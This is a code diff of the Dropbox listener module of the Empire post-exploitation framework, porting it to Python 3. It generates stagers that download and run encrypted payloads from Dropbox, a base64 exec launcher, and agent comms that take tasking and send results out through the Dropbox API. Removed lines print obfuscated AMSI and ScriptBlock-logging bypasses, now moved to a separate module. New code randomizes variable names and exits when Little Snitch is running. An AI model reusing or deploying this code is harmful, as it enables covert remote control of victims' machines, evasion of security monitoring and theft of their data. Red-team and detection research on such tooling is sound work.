@@ -1,25 +1,27 @@
+from __future__ import print_function
+
 import base64
-import random
-import os
-import time
 import copy
 import json
+import os
+import time
+from builtins import object
+from builtins import str
+
 import dropbox
 # from dropbox.exceptions import ApiError, AuthError
 # from dropbox.files import FileMetadata, FolderMetadata, CreateFolderError
 from pydispatch import dispatcher
 
+from lib.common import encryption
 # Empire imports
 from lib.common import helpers
-from lib.common import agents
-from lib.common import encryption
-from lib.common import packets
-from lib.common import messages
-from lib.common import templating
 from lib.common import obfuscation
+from lib.common import templating
+from lib.common import bypasses
 
 
-class Listener:
+class Listener(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -153,19 +155,19 @@ class Listener:
 
         for key in self.options:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
-                print helpers.color("[!] Option \"%s\" is required." % (key))
+                print(helpers.color("[!] Option \"%s\" is required." % (key)))
                 return False
 
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
         """
         Generate a basic launcher for the specified listener.
         """
 
         if not language:
-            print helpers.color('[!] listeners/dbx generate_launcher(): no language specified!')
+            print(helpers.color('[!] listeners/dbx generate_launcher(): no language specified!'))
 
         if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):
 
@@ -190,39 +192,19 @@ class Listener:
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.Utils'"
-                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
-                    stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    stager += "('EnableScriptB'+'lockLogging',0);"
-                    stager += helpers.randomize_capitalization("$val.Add")
-                    stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("=$val}")
-                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-
+                    if scriptLogBypass:
+                        stager += bypasses.scriptBlockLogBypass()
                     # @mattifestation's AMSI bypass
-                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
-                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    if AMSIBypass:
+                        stager += bypasses.AMSIBypass()
+                    # rastamouse AMSI bypass
+                    if AMSIBypass2:
+                        stager += bypasses.AMSIBypass2()
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
-                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+"=New-Object System.Net.WebClient;")
 
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
@@ -232,19 +214,19 @@ class Listener:
                 if userAgent.lower() != 'none' or proxy.lower() != 'none':
 
                     if userAgent.lower() != 'none':
-                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
+                        stager += helpers.randomize_capitalization('$'+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
                         stager += "'User-Agent',$u);"
 
                     if proxy.lower() != 'none':
                         if proxy.lower() == 'default':
-                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                         else:
                             # TODO: implement form for other proxy
                             stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                             stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
-                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy = $proxy;")
                         if proxyCreds.lower() == "default":
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
                             # TODO: implement form for other proxy credentials
                             username = proxyCreds.split(':')[0]
@@ -252,10 +234,10 @@ class Listener:
                             domain = username.split('\\')[0]
                             usr = username.split('\\')[1]
                             stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = $netcred;")
 
                         #save the proxy settings to use during the entire staging process and the agent
-                        stager += "$Script:Proxy = $wc.Proxy;"
+                        stager += "$Script:Proxy = $"+helpers.generate_random_script_var_name("wc")+".Proxy;"
 
                 # TODO: reimplement stager retries?
 
@@ -268,12 +250,12 @@ class Listener:
 
                 # add in the Dropbox auth token and API params
                 stager += "$t='%s';" % (apiToken)
-                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                 stager += "\"Authorization\",\"Bearer $t\");"
-                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
+                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                 stager += "\"Dropbox-API-Arg\",'{\"path\":\"%s/debugps\"}');" % (stagingFolder)
 
-                stager += helpers.randomize_capitalization("$data=$WC.DownloadData('")
+                stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData('")
                 stager += "https://content.dropboxapi.com/2/files/download');"
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
@@ -298,14 +280,13 @@ class Listener:
                     if safeChecks.lower() == 'true':
                         launcherBase += "import re, subprocess;"
                         launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
-                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
-                        launcherBase += "out = ps.stdout.read()\n"
-                        launcherBase += "ps.stdout.close()\n"
+                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
+                        launcherBase += "out, err = ps.communicate()\n"
                         launcherBase += "if re.search(\"Little Snitch\", out):\n"
                         launcherBase += "   sys.exit()\n"
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stager: " + str(e)
-                    print helpers.color(p, color='red')
+                    print(helpers.color(p, color='red'))
 
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
@@ -366,13 +347,13 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
 
         else:
-            print helpers.color("[!] listeners/dbx generate_launcher(): invalid listener name specification!")
+            print(helpers.color("[!] listeners/dbx generate_launcher(): invalid listener name specification!"))
 
 
     def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
@@ -381,7 +362,7 @@ class Listener:
         """
 
         if not language:
-            print helpers.color('[!] listeners/dbx generate_stager(): no language specified!')
+            print(helpers.color('[!] listeners/dbx generate_stager(): no language specified!'))
             return None
 
         pollInterval = listenerOptions['PollInterval']['Value']
@@ -460,7 +441,7 @@ class Listener:
                 return stager
 
         else:
-            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
+            print(helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
 
 
     def generate_agent(self, listenerOptions, language=None):
@@ -469,7 +450,7 @@ class Listener:
         """
 
         if not language:
-            print helpers.color('[!] listeners/dbx generate_agent(): no language specified!')
+            print(helpers.color('[!] listeners/dbx generate_agent(): no language specified!'))
             return None
 
         language = language.lower()
@@ -532,7 +513,7 @@ class Listener:
 
             return code
         else:
-            print helpers.color("[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module.")
+            print(helpers.color("[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module."))
 
 
     def generate_comms(self, listenerOptions, language=None):
@@ -560,28 +541,28 @@ class Listener:
     $script:GetTask = {
         try {
             # build the web request object
-            $wc = New-Object System.Net.WebClient
+            $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
 
             # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
             if($Script:Proxy) {
-                $wc.Proxy = $Script:Proxy;
+                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
             }
 
-            $wc.Headers.Add("User-Agent", $script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent", $script:UserAgent)
+            $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
             $TaskingsFolder = "%s"
-            $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)")
-            $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
-            $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download")
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($Script:APIToken)")
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
+            $Data = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData("https://content.dropboxapi.com/2/files/download")
 
             if($Data -and ($Data.Length -ne 0)) {
                 # if there was a tasking data, remove it
-                $wc.Headers.Add("Content-Type", " application/json")
-                $wc.Headers.Remove("Dropbox-API-Arg")
-                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
+                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Content-Type", " application/json")
+                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Remove("Dropbox-API-Arg")
+                $Null=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
                 $Data
             }
             $script:MissedCheckins = 0
@@ -607,16 +588,16 @@ class Listener:
             $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
 
             # build the web request object
-            $wc = New-Object System.Net.WebClient
+            $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
             # set the proxy settings for the WC to be the default system settings
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
             if($Script:Proxy) {
-                $wc.Proxy = $Script:Proxy;
+                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
             }
 
-            $wc.Headers.Add('User-Agent', $Script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
+            $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
             $ResultsFolder = "%s"
 
@@ -625,9 +606,9 @@ class Listener:
                 #   download the file and append the new routing packet to it
                 try {
                     $Data = $Null
-                    $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
-                    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
-                    $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download")
+                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($Script:APIToken)");
+                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
+                    $Data = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData("https://content.dropboxapi.com/2/files/download")
                 }
                 catch { }
 
@@ -635,17 +616,17 @@ class Listener:
                     $RoutingPacket = $Data + $RoutingPacket
                 }
 
-                $wc2 = New-Object System.Net.WebClient
-                $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                $"""+helpers.generate_random_script_var_name("wc")+"""2 = New-Object System.Net.WebClient
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                 if($Script:Proxy) {
-                    $wc2.Proxy = $Script:Proxy;
+                    $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy = $Script:Proxy;
                 }
 
-                $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
-                $wc2.Headers.Add("Content-Type", "application/octet-stream")
-                $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
-                $Null = $wc2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket)
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Content-Type", "application/octet-stream")
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
+                $Null = $"""+helpers.generate_random_script_var_name("wc")+"""2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket)
                 $script:MissedCheckins = 0
             }
             catch {
@@ -671,7 +652,7 @@ def send_message(packets=None):
     def post_message(uri, data, headers):
         req = urllib2.Request(uri)
         headers['Authorization'] = "Bearer REPLACE_API_TOKEN"
-        for key, value in headers.iteritems():
+        for key, value in headers.items():
             req.add_header("%s"%(key),"%s"%(value))
 
         if data:
@@ -745,7 +726,7 @@ def send_message(packets=None):
                 sendMessage = sendMessage.replace('REPLACE_API_TOKEN', apiToken)
                 return sendMessage
         else:
-            print helpers.color('[!] listeners/dbx generate_comms(): no language specified!')
+            print(helpers.color('[!] listeners/dbx generate_comms(): no language specified!'))
 
 
     def start_server(self, listenerOptions):
@@ -859,7 +840,7 @@ def send_message(packets=None):
         try:
             dbx.users_get_current_account()
         except dropbox.exceptions.AuthError as err:
-            print helpers.color("[!] ERROR: Invalid access token; try re-generating an access token from the app console on the web.")
+            print(helpers.color("[!] ERROR: Invalid access token; try re-generating an access token from the app console on the web."))
             return False
 
         # setup the base folder structure we need
@@ -904,7 +885,7 @@ def send_message(packets=None):
             dbx.files_upload(stagerCodeps, "%s/debugps" % (stagingFolder))
             dbx.files_upload(stagerCodepy, "%s/debugpy" % (stagingFolder))
         except dropbox.exceptions.ApiError:
-            print helpers.color("[!] Error uploading stager to '%s/stager'" % (stagingFolder))
+            print(helpers.color("[!] Error uploading stager to '%s/stager'" % (stagingFolder)))
             return
 
         while True:
@@ -1147,8 +1128,8 @@ def send_message(packets=None):
         """
 
         if name and name != '':
-            print helpers.color("[!] Killing listener '%s'" % (name))
+            print(helpers.color("[!] Killing listener '%s'" % (name)))
             self.threads[name].kill()
         else:
-            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
+            print(helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value'])))
             self.threads[self.options['Name']['Value']].kill()
